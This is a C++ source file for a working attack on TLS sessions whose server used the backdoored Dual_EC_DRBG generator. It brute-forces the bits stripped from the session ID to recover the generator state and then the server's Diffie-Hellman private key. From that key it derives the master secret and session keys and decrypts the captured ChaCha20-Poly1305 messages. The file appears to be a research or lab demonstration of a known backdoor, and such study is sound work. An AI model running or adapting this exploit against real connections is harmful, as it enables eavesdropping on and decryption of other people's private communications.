#include "commons.h"
#include "bitstr.h"
#include "forward.h"
#include "input.h"
#include "dualec_curve.h"
#include "mbedtls/cipher.h"
#include <array>
#include <bits/stdint-uintn.h>
#include <cstdlib>
#include <gmp++/gmp++_int.h>
#include <iomanip>
#include <ios>
#include <iostream>
#include <string>
#include <vector>
#include <mbedtls/ssl.h>
#include "dualec.h"
#include "mbedtls/error.h"
#include <queue>
#include <future>

#define TLS_ATTACK_DETERMINISTIC

constexpr auto MASTER_SECRET_LEN = 48;

static auto* cipher_info = mbedtls_cipher_info_from_type(MBEDTLS_CIPHER_CHACHA20_POLY1305);
static BigInt no_of_threads = 11;

void remove_leading_zero_bytes(barr& input)
{
    while (!input.empty() && input.front() == 0)
        input.erase(input.begin());
}

/* pseudorandom function */
[[nodiscard]] barr prf(barr secret, std::string label, barr seed, size_t dst_len)
{
    barr dst;
    dst.resize(dst_len);
    auto ret = mbedtls_ssl_tls_prf(MBEDTLS_SSL_TLS_PRF_SHA256,
            &secret.front(), secret.size(),
            label.c_str(),
            &seed.front(), seed.size(),
            &dst.front(), dst.size());
    if (ret != 0) {
        std::cout << "mbedtls_ssl_tls_prf returned " << ret << std::endl;
        abort();
    }
    return dst;
}

/* See https://tools.ietf.org/html/rfc5246#section-8.1 */
[[nodiscard]] barr calculate_master_secret(barr const& pre_master_secret, barr const& server_hello_random, barr const& client_hello_random)
{
    barr random;
    random.insert(random.end(), client_hello_random.begin(), client_hello_random.end());
    random.insert(random.end(), server_hello_random.begin(), server_hello_random.end());
    return prf(pre_master_secret, "master secret", random, MASTER_SECRET_LEN);
}

static void print_barr(barr input)
{
    for (auto const& b : input)
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(b) << " ";
}

struct WorkingKeys {
    barr client_write_key;
    barr server_write_key;
    barr server_enc_iv;
    barr client_enc_iv;

    void print() const
    {
        std::cout << "working_keys: ";
        std::cout << "\n\tclient_write_key: ";
        print_barr(client_write_key);
        std::cout << "\n\tserver_write_key: ";
        print_barr(server_write_key);
        std::cout << "\n\tiv_enc: ";
        print_barr(server_enc_iv);
        std::cout << "\n\tiv_dec: ";
        print_barr(client_enc_iv);
        std::cout << std::endl;
    }
};

WorkingKeys generate_working_keys(barr master_secret, barr random_seed)
{
    WorkingKeys wk;
    barr keyblk = prf(master_secret, "key expansion", random_seed, 256);
    // observed testcase -- keylen: 32, minlen: 16, ivlen: 12, maclen: 0

    auto keylen = cipher_info->key_bitlen / 8;
    auto ivlen = cipher_info->iv_size;
    auto mac_key_len = 0;
    decltype(auto) blkptr = &keyblk.front();
    auto mac_dec = blkptr;
    auto mac_enc = blkptr + mac_key_len;
    auto key_dec = blkptr + mac_key_len * 2;
    auto key_enc = blkptr + mac_key_len * 2 + keylen;

    auto iv_copy_len = ivlen;

    wk.server_write_key.insert(wk.server_write_key.begin(), key_enc, key_enc + keylen);
    wk.client_write_key.insert(wk.client_write_key.begin(), key_dec, key_dec + keylen);
    wk.client_enc_iv.insert(wk.client_enc_iv.begin(), key_enc + keylen, key_enc + keylen + iv_copy_len);
    wk.server_enc_iv.insert(wk.server_enc_iv.begin(), key_enc + keylen + iv_copy_len, key_enc + keylen + iv_copy_len + iv_copy_len);

    /* NOTE: Macs are left out, because maclen = 0 */
    return wk;
}

barr encrypt(WorkingKeys wk, barr data, barr add_data) {
    constexpr auto taglen = 16;

    mbedtls_cipher_context_t c;
    mbedtls_cipher_init(&c);
    mbedtls_cipher_setup(&c, cipher_info);
    mbedtls_cipher_set_iv(&c, &wk.server_enc_iv.front(), wk.server_enc_iv.size());
    mbedtls_cipher_setkey(&c, &wk.server_write_key.front(), wk.server_write_key.size()*8, MBEDTLS_ENCRYPT);

    barr output;
    output.resize(data.size() + taglen);
    size_t olen = 0;
    mbedtls_cipher_auth_encrypt_ext(&c,
                                    &wk.server_enc_iv.front(), wk.server_enc_iv.size(),
                                    &add_data.front(), add_data.size(),
                                    &data.front(), data.size(), /* src */
                                    &output.front(), output.size(), /* dst */
                                    &olen, taglen);
#ifdef TLS_ATTACK_DETERMINISTIC
    std::cout << "Encrypted: ";
    print_barr(output);
    std::cout << std::endl;
#endif
    return output;
}

barr decrypt(WorkingKeys wk, barr enc_input, barr ad_input, barr iv_input, size_t decrypted_len, bool from_server)
{
    mbedtls_cipher_context_t c;
    mbedtls_cipher_init(&c);
    mbedtls_cipher_setup(&c, cipher_info);
    if (from_server)
        mbedtls_cipher_setkey(&c, &wk.server_write_key.front(), wk.server_write_key.size()*8, MBEDTLS_DECRYPT);
    else
        mbedtls_cipher_setkey(&c, &wk.client_write_key.front(), wk.client_write_key.size()*8, MBEDTLS_DECRYPT);

    barr dec_output;
    dec_output.resize(decrypted_len);
    size_t olen;
    auto ret = mbedtls_cipher_auth_decrypt_ext(&c,
            &iv_input.front(), iv_input.size(),
            &ad_input.front(), ad_input.size(),
            &enc_input.front(), enc_input.size(),
            &dec_output.front(), dec_output.size(),
            &olen, 16);
    if (ret < 0)
        std::cout << "RET: " << mbedtls_high_level_strerr(ret) << std::endl;

    return dec_output;
}

void calculate_s_from_r(BitStr& opt1, BitStr& opt2, BigInt const& r, Input const& input)
{
    AffinePoint R1, R2;
    input.dec_curve.curve.lift_x(R1, R2, r);
     //  it holds that s2 = x(d * R)
    if (!R1.is_identity())
        opt1 = BitStr(DEC::mul(input.dec_secret_d, R1, input.dec_curve.curve).x(), DEC::pick_seedlen(input.dec_security_strength));
    if (!R2.is_identity())
        opt2 = BitStr(DEC::mul(input.dec_secret_d, R2, input.dec_curve.curve).x(), DEC::pick_seedlen(input.dec_security_strength));
}

BitStr bitstr_from_barr(barr input)
{
    BitStr out = BitStr(0);
    for (auto const& b : input)
        out = out + BitStr(BigInt(b), 8);
    return out;
}

std::optional<BigInt> try_calc_private_key(BitStr const& guessed_stripped_bits, BitStr const& validify_bits, BitStr const& inner_dec_serv_rand, Input const& input, DEC::WorkingState& working_state)
{
    BitStr guessed_r = guessed_stripped_bits + inner_dec_serv_rand;
    /* Step 3: Calculate the next state s_(i+1) */
    BitStr s_opt1 = BitStr(0), s_opt2 = BitStr(0); // default
    calculate_s_from_r(s_opt1, s_opt2, guessed_r.as_big_int(), input);

    for (auto const& s : {s_opt1, s_opt2}) {
        if (s.as_big_int() == 0)
            continue;
        working_state.s = BitStr(std::move(s));
        /* Step 3.1: Generate server-session-id last 2 bytes */
        auto to_validify = BitStr(DEC::mul(working_state.s.as_big_int(), working_state.dec_curve.Q, working_state.dec_curve.curve).x())
            .truncated_rightmost(working_state.outlen)
            .truncated_leftmost(2*8);
        if (to_validify.as_big_int() != validify_bits.as_big_int())
            continue;
        working_state.s = BitStr(DEC::mul(working_state.s.as_big_int(), working_state.dec_curve.P, working_state.dec_curve.curve).x(), working_state.seedlen);
        std::cout << "\nPossible s found: " << working_state.s.as_hex_string() << std::endl;
        /* Step 4: Generate enough random bits for a. Calculate a by subtracting 1 from the bits */
        auto a_bits = DEC::Generate(working_state, input.dh_bitlen_of_a, input.dec_adin);
        auto a = a_bits.as_big_int() - 1;
        /* Step 5: Calculate g^a (mod p) and check if it matches pubKeyServer
         *         If it didn't go to step 2.*/
        auto ga = Givaro::powmod(input.dh_generator, a, input.dh_prime);
        if (ga == input.dh_pubkey_server)
            return a;
    }
    return {};
}

struct Iterator {
    Iterator(BigInt start, BigInt end_excl)
        : m_start(std::move(start))
        , m_end(std::move(end_excl))
        , m_current(m_start)
    {
    }
    BigInt m_start;
    BigInt m_end;
    [[nodiscard]] BigInt current() const { if (m_current >= m_end) abort();
        return m_current; }
    [[nodiscard]] bool has_next() const { return m_current + 1 < m_end; }
    BigInt advance() {
        return m_current++; }
    [[nodiscard]] int percentage() const { return (current()-m_start+2)*100 / (m_end-m_start); }
private:
    BigInt m_current;
};

static std::queue<std::shared_future<std::optional<BitStr>>> workers;
static std::vector<int> finished_worker;
static std::vector<int> progess;

static void push_worker(std::function<std::optional<BitStr>()> func)
{
    workers.push(std::async(std::launch::async, func));
}

BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, BitStr const& validify_bits, Input const& input)
{
    std::cout << "Using the following curve: " << input.dec_curve.to_string() << std::endl;
    std::stop_source stop_source;

    auto stripped_amount_of_bits = DEC::pick_seedlen(input.dec_security_strength) - DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength));

    std::cout << "Amount of bits to brute force: " << stripped_amount_of_bits << std::endl;
    /* Step 2: Guess the last 4 bytes (because they were stripped to make room for the unix timestamp)
     *         and the stripped bits from the front */
    auto strip_bound = BigInt(1) << stripped_amount_of_bits;
    auto strip_per_thread = strip_bound / no_of_threads;

    progess.resize(no_of_threads);
    finished_worker.resize(no_of_threads);
    auto* progress_bucket = &progess[0];
    auto* finish_bucket = &finished_worker[0];
    for (BigInt thread_start(0), thread_end(strip_per_thread); thread_end <= strip_bound; thread_end += strip_per_thread, thread_start += strip_per_thread, ++progress_bucket, ++finish_bucket) {
        auto lambda = [&validify_bits, progress_bucket,finish_bucket, &stop_source, thread_start, thread_end, stripped_amount_of_bits, &inner_dec_serv_rand, &input]() -> std::optional<BitStr> {
             auto working_state = DEC::WorkingState {
                .s = BitStr(-1),
                .seedlen = DEC::pick_seedlen(input.dec_security_strength),
                .dec_curve = input.dec_curve,
                .outlen = DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength))};
            auto guesser = Iterator(thread_start, thread_end);
            auto stoken = stop_source.get_token();
            while (guesser.has_next() && !stoken.stop_requested()) {
                *progress_bucket = guesser.percentage();
                auto guess = BitStr(guesser.advance(), stripped_amount_of_bits);
                auto result = try_calc_private_key(guess, validify_bits, inner_dec_serv_rand, input, working_state);
                if (result.has_value()) {
                    stop_source.request_stop();
                    *finish_bucket = 1;
                    return result;
                }
            }
            *finish_bucket = 1;
            return {};
        };
        push_worker(lambda);
    }

    std::cout << "Progress:" << std::endl;
    for (size_t i = 0; i < no_of_threads; ++i)
        std::cout << " T" << std::setfill('0') << std::setw(2) << i << " ";
    std::cout << std::endl;
    auto stoken = stop_source.get_token();
    while (!stoken.stop_requested()) {
        bool all_done = true;
        for (auto const& f : finished_worker)
            if (!f)
                all_done = false;
        if (all_done)
            break;
        std::cout << "\r";
        for (auto const& p : progess)
            std::cout << std::setfill(' ') << std::right << std::setw(3) << p << "% ";
        std::cout << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }
    std::cout << std::endl;


    while (!workers.empty()) {
        auto ret = workers.front().get(); // blocking until finished by stop_source
        if (ret.has_value()) {
            auto ri = ret.value().as_big_int();
            while (!workers.empty())
                workers.pop();
            return ri;
        }
        workers.pop();
    }
    std::cout << "Unexpected end of brute force" << std::endl;
    abort();
}

barr aead_from_contentlen(size_t content_length)
{
    size_t message_len = content_length - 16;
    /* content = record - header */
    barr aead = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x17, 0x03, 0x03, 0xaa, 0xaa};
    aead[aead.size() - 2] = (message_len & 0xff00) >> 8;
    aead[aead.size() - 1] = message_len & 0xff;
    return aead;
}

barr barr_from_bitstr(BitStr input)
{
    auto input_arr = input.to_baked_array();
    auto iv_barr = barr(input_arr.data(), input_arr.data() + input_arr.size());
    return iv_barr;
}

int main()
{
    auto input = setup_input();
    /* Input:
     *      TLS: server-random, client-random, server-session-id
     *      DH: generator, prime, bitlength of a, pubKeyServer = g^a (mod p), pubKeyClient = g^b (mod p).
     *      DualEC: security-stength, Q, d, s.t. dQ = P, adins used for generating, personalization string
     * Assumption:
     *      server used DualEC to generate server-session-id and (a+1),
     *      used cipher: MBEDTLS_CIPHER_CHACHA20_POLY1305
     */
    /* Step 1: Take the first 30 bytes of server-session-id (for 128 security strength) */
    BitStr inner_dec_serv_rand = bitstr_from_barr(barr(input.server_session_id.begin(), input.server_session_id.begin() + 30));
    BitStr validify_bits = bitstr_from_barr(barr(input.server_session_id.begin() + 30, input.server_session_id.begin() + 32));
    BigInt server_private = guess_server_private_key(inner_dec_serv_rand, validify_bits, input);
    std::cout << "SUCCESS!!! server private key is:\n\t" << bigint_hex(server_private) << std::endl;
    /* Step 6: Calculate the pre-master-secret with pubKeyClient^a (mod p) */
    auto pms = Givaro::powmod(input.dh_pubkey_client, server_private, input.dh_prime);
    auto pre_master_secret = barr_from_bitstr(BitStr(pms));
    /* Step 7: Calculate the master secret with the given information */
    remove_leading_zero_bytes(pre_master_secret);
    auto master_secret = calculate_master_secret(pre_master_secret, input.server_random, input.client_random);
    /* Step 8: Calculate the working_keys and decrpyt the message */
    barr random_;
    random_.insert(random_.end(), input.server_random.begin(), input.server_random.end());
    random_.insert(random_.end(), input.client_random.begin(), input.client_random.end());
    auto working_keys = generate_working_keys(master_secret, random_);
    working_keys.print();


    static auto decrypt_buffer_len = 2000;

    for (auto const& msg : input.messages) {
        /* AEAD = message_len. record = header + encrypted_message + tag (16 bytes) */
        auto aead = aead_from_contentlen(msg.container.size());

        auto iv = bitstr_from_barr(msg.from_server ? working_keys.server_enc_iv : working_keys.client_enc_iv).as_big_int() - msg.iv_offset;
        auto iv_barr = barr_from_bitstr(BitStr(iv, cipher_info->iv_size*8));

        auto decrypted = decrypt(working_keys, msg.container, aead, iv_barr, decrypt_buffer_len, msg.from_server);
        std::cout << ">>>" << (msg.from_server ? "Server" : "Client") << " decrypted:\n";
        for (auto const& o : decrypted) {
            if (o == 0) break;
            std::cout << o;
        }
        std::cout << std::endl;
    }

    return 0;
}
